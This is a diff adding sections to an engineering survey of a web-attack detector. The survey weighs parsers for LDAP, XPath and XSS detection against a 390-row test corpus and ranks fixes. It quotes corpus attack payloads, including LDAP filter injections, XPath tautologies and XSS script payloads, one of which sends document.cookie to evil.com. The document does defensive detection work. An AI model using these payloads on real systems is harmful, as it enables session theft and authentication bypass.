@@ -325,6 +325,245 @@ the pickle stream *is* the program, not a hint about one.
 **Verdict: should, and the candidate is ~200 lines of our own code with zero new
 dependencies.**
 
-## Unfinished
+### LDAP — the small-grammar intuition is wrong, and it was measured
 
-This section is filled in as the remaining families are evaluated.
+RFC 4515 is a tiny grammar, so the intuition is that this is the best
+return on investment in the survey: a small parser is a small attack surface.
+The intuition was tested against the corpus rather than trusted, and it does not
+survive.
+
+Three rows are missed today:
+
+```
+ldap-005  user=*&pw=*                      bare wildcard credential bypass
+ldap-007  user=admin*)((|userPassword=*)   or-clause attribute leak
+ldap-015  a=*)(uid&b==*                    split across two query parameters
+```
+
+`ldap-005` carries no filter syntax at all — the value is one character, `*`.
+There is nothing to parse. `ldap-015` splits the payload across two parameters
+that the application concatenates; no single-field detector, parser or otherwise,
+can see it. Only `ldap-007` is a genuine parse-shaped miss: the regexes look for
+`)(` followed by a logical operator or a known attribute, and `)((|` puts an
+extra grouping paren in between, so both default-on rules step over it.
+
+Two prototypes were built and run against all 390 rows.
+
+**Prototype 1 — paren balance.** An injected fragment borrows the application's
+enclosing parens, so it should be unbalanced, while a legitimately-submitted
+filter is balanced. Result: **3/15** attacks, against the shipped 12/15, and four
+benign rows firing. The premise is simply false — `*)(uid=*))(|(uid=*` has three
+`(` and three `)`. Injections balance themselves all the time.
+
+**Prototype 2 — a real RFC 4515 recursive-descent parser** (~120 lines, explicit
+depth cap). Fire when the value does not parse as a complete standalone filter
+but, wrapped in the application's presumed `(uid=VALUE)` template, yields a
+complete filter with a non-empty remainder — the literal definition of closing
+the application's filter early and appending your own.
+
+| | attacks caught | benign firing |
+|---|---|---|
+| shipped default-on regexes | 12/15 | 1 (and it is a **Block**) |
+| RFC 4515 fragment parser | 13/15 | 6 |
+
+It picks up `ldap-007` and `ldap-015`, loses `ldap-009` (hex-escaped `\2a\29\28`,
+which the escape regex catches and a parser only catches if you decode RFC 4515
+escapes first), and triples the benign false positives. The four new ones are
+parenthesised prose that structurally *is* a filter fragment: a code-review
+comment containing `` `$(git rev-parse HEAD)` ``, a markdown code fence, an ORM
+debug log, a reporting filter DSL. A parser cannot tell those apart from an
+injection, because structurally they are not different.
+
+**And it does not fix the one thing worth fixing.** `content-099` — an LDAP admin
+page saving `(&(objectClass=person)(uid=jsmith))` — is one of only two benign
+rows in the entire corpus that the lane would *block*. The parser diagnoses it
+correctly at leaf level: that value parses end-to-end as a complete standalone
+filter, so it is a filter-authoring tool's payload, not a fragment. Used as a
+suppressor it should retract the Block.
+
+It does not, and the reason is instructive. `preprocess` keeps the whole request
+body as a view *alongside* the extracted leaves
+(`preprocess.rs:1413`, `structured_body_extracts_leaves_and_preserves_whole_body_view`).
+The whole-body view contains the filter as a substring, fires
+`ldap.filter_break_known_attr`, and does not parse as a complete filter — because
+it is a JSON document, not a filter. The suppressor was measured: benign rows
+matched before, `[content-099]`; after, `[content-099]`.
+
+Fixing `content-099` is a scope question — which routes accept filter syntax,
+answered in `enforcement_overrides` — exactly as `tests/lane2/README.md` already
+concludes. It is not a parsing question.
+
+**Verdict: do not. +1 attack, 6× benign false positives, and it does not fix the
+blocking FP. The shipped regexes are already at 80 % with one FP.**
+
+### XPath — the parser that would catch the miss is already in the tree
+
+Two rows missed:
+
+```
+xpath-007  user=' or 1=1 or ''='                      numeric tautology
+xpath-013  {"q":"x' return //user/password] for $x in //user return $x/(:"}
+```
+
+`xpath-013` is XQuery, not XPath. A FLWOR expression (`for … in … return …`) is
+not in the XPath 1.0 grammar, so an XPath parser rejects it and produces nothing.
+Catching it needs an XQuery parser, for one corpus row.
+
+`xpath-007` is a real tautology, missed because `xpath.quote_tautology` requires
+both operands quoted and single-character, and `1=1` is unquoted. This is exactly
+the shape a parser folds. **And the tree already has the parser that does it.**
+
+The shipped `AstSqlDetector` wraps a view in a synthetic enclosing context and
+parses the result — `select * from t where c = {v}`, falling back to
+`select * from t where c = '{v}'` when the view holds a quote — then walks the
+`WHERE` clause for a comparison between two literals. Run against the corpus
+values (`sqlparser` 0.62, `GenericDialect`, verbatim wrapping):
+
+```
+SQL-AST HIT   xpath-007  via quote-wrap  :: select * from t where c = '' or 1=1 or ''=''
+SQL-AST HIT   xpath-001  via quote-wrap  :: select * from t where c = '' or '1'='1'
+SQL-AST HIT   xpath-006  via quote-wrap  :: select * from t where c = 'x' or name()='username' or 'x'='y'
+SQL-AST miss  xpath-013                  :: x' return //user/password] for $x in //user return $x/(:
+SQL-AST miss  ldap-007                   :: admin*)((|userpassword=*)
+```
+
+`xpath-007` is not blind. It is detected, by the SQL AST, and recorded under
+`sql_injection` — which is why it does not appear in the XPath family's row. The
+detector's own comment anticipated this: the quote-closed tautology deliberately
+overlaps SQLi, and "the payload is structurally a tautology-injection whichever
+backend consumes it".
+
+So the XPath family's *measured* deficit against a parser is: one XQuery row that
+an XPath parser could not have caught either. A second recursive-descent
+expression parser would be added to catch nothing.
+
+The real XPath finding is a **reporting** one, not a detection one: a tautology
+that both families can see is attributed to whichever detector reports it, and
+the family-level recall table understates XPath as a result. That is worth a note
+in the corpus report; it is not worth `sxd-xpath`.
+
+**Verdict: do not.**
+
+### XSS-JS — the Block gap is in the parser already running
+
+XSS is the family the brief expected to need a parser most, and it is the one
+where the measurement is most lopsided: **90 % detected in shadow, 15 % blocked
+in enforce.** Detection is nearly saturated. What fails is corroboration.
+
+The family is weighted `xss_dom = 0.5 / xss_js = 0.5` with `block_threshold = 80`,
+so Block requires both detectors to fire on the same field. `xss_js` reads only
+what `xss_dom` hands it, and `scan_element` (`xss_dom.rs:486`) pushes exactly two
+kinds of context:
+
+* the value of an `on*=` event-handler attribute;
+* the script body of a `javascript:` / `vbscript:` URL.
+
+**`<script>` element text content is never pushed.** The `script` arm of the
+`match` records `xss.script_tag` and moves on; the rawtext child the parser
+already built is dropped.
+
+Four of the twenty corpus attacks put their JavaScript in a `<script>` body:
+
+```
+xss-006  "><script>alert(document.cookie)</script>
+xss-009  <script>new Image().src='//evil.com/?c='+document.cookie</script>
+xss-017  {"profile":{"settings":{"bio":"</script><script>alert(document.cookie)</script>"}}}
+xss-019  <script>window['al'+'ert'](1)</script>
+```
+
+Three of the four contain `document.cookie` verbatim — the highest-confidence
+token in `EXFIL_TOKENS`, default-on, confidence 88. Every one of them fires
+`xss.script_tag` at 0.5. Not one can ever reach Block, because the string
+`xss_js` would match on is in a node `xss_dom` walks past without collecting.
+
+That is a handful of lines in a walk that is already running, on a tree that is
+already built, with **no new parse surface, no new dependency and no new CPU** —
+html5ever has already parsed the script content as text by the time `scan_element`
+sees the element.
+
+Only then is the JS-parser question worth asking, and the answer is no. What a
+real JS AST adds over the token tables is constant folding and computed member
+access:
+
+```
+eval('doc' + 'ument.coo' + 'kie')
+self["docu" + "ment"]["coo" + "kie"]
+eval(`${'doc'}ument.cookie`)
+```
+
+None of these is in the corpus. `xss-019` is the closest — `window['al'+'ert'](1)`
+— and folding it yields `alert`, which is deliberately **not** in the token
+tables, because a benign handler pops dialogs and `alert` is evidence of "this is
+JS", not of an attack. Folding it changes nothing.
+
+Against that, the cost is the largest in the survey:
+
+* every candidate (`boa_parser`, `oxc_parser`, `swc_ecma_parser`) is a
+  recursive-descent parser over a grammar far larger than SQL's. The
+  stack-overflow guard would have to over-approximate ECMAScript's recursion
+  drivers the way `ast_structural_depth_ok` over-approximates `sqlparser`'s — a
+  much harder scan to get right, and `contain_parser_panic` cannot help:
+  a stack overflow aborts the process rather than unwinding
+  (`detectors.rs:2321`);
+* they are large, fast-moving dependencies whose panic discipline we would be
+  adopting, which is the `brush-parser` lesson verbatim;
+* and the RASP ceiling is untouched. XSS truth is a browser-behaviour question —
+  parse-differential and mutation-XSS are physical false-negative sources that
+  `xss_dom.rs` already names in its own module docs. A correct JS parse tells you
+  what the JS means, never whether it runs.
+
+**Verdict: do not add a JS parser. Collect `<script>` text content into
+`js_contexts` in the walk that is already running — that is where the 90 %/15 %
+gap lives.**
+
+## Ranking
+
+If one thing is done, in order:
+
+1. **Deserialization — pickle opcode walker.** The only place a parse produces a
+   structurally certain verdict rather than a resemblance judgment, and the only
+   family with a blind spot no regex can close: the default-on rule matches
+   protocol-0 text `GLOBAL`, and every pickle a modern Python emits uses
+   `STACK_GLOBAL`. ~200 lines, no dependency, flat and non-recursive, executes
+   nothing. Best ratio in the survey by a wide margin.
+2. **XSS — collect `<script>` text into `js_contexts`.** Not a parser change at
+   all; it is the missing few lines that keep four corpus rows, three of them
+   carrying `document.cookie`, permanently below the Block threshold. Zero new
+   surface. Ranked second only because it fixes enforcement, not detection.
+3. **NoSQL — bracket notation in the form-parameter extractor.** `password[$ne]=x`
+   is how this bypass is actually delivered, and `qs` / Rails / PHP all expand it.
+   Extractor work, not detector work; it makes the already-written default-off
+   rules effective on the day they are calibrated.
+4. **Everything else — configuration and rule rows, not parsers.** Two XXE flips
+   plus an XInclude row; five SSTI engine signatures; `\xNN` decoding in the
+   shared preprocessor; two traversal flips gated on route scope.
+
+Nothing above requires a new parser dependency. That is the survey's conclusion,
+not an accident of ordering.
+
+## What this survey did not settle
+
+* **The corpus is 390 rows.** Every "currently missed" claim is anchored to a real
+  committed row, but 15 rows per family cannot establish a false-positive rate.
+  The corpus's own README says the same about `rollout_bps`.
+* **The default-on rule tables were re-implemented in Python** to identify the
+  blind rows the baseline only counts. It reproduces the recorded per-family
+  numbers to within one row (SSTI 6 simulated vs 5 recorded), so at least one
+  attribution below is probably wrong. The decode-chain model is an
+  approximation: form-parameter splitting, JSON leaf extraction and blind base64
+  are modelled; multipart, GraphQL, hex and `lower_trunc` token truncation are
+  not.
+* **No CPU numbers were measured.** The cost column is reasoned from parser shape
+  (flat opcode walk vs recursive descent) and from the prefilter/budget machinery
+  the tree already applies, not from a benchmark. `tests/perf/` was deliberately
+  not run.
+* **`ldap-009` regression.** The RFC 4515 prototype loses the hex-escape row. A
+  production parser would decode RFC 4515 escapes before parsing and might keep
+  it, which would make the prototype's 13/15 a 14/15. That was not built, so the
+  measured comparison is the pessimistic one for the parser.
+* **PHP `serialize()` was not prototyped.** The claim that a format parser reduces
+  false positives and reaches nested objects (`deser-015`) is reasoned from the
+  format's grammar, not measured.
+* **`xxe-005` is asserted, not run.** `RuleKind::Count(3)` should fire on a
+  payload declaring three entities; the counting semantics (per view? per
+  request?) were read, not exercised.
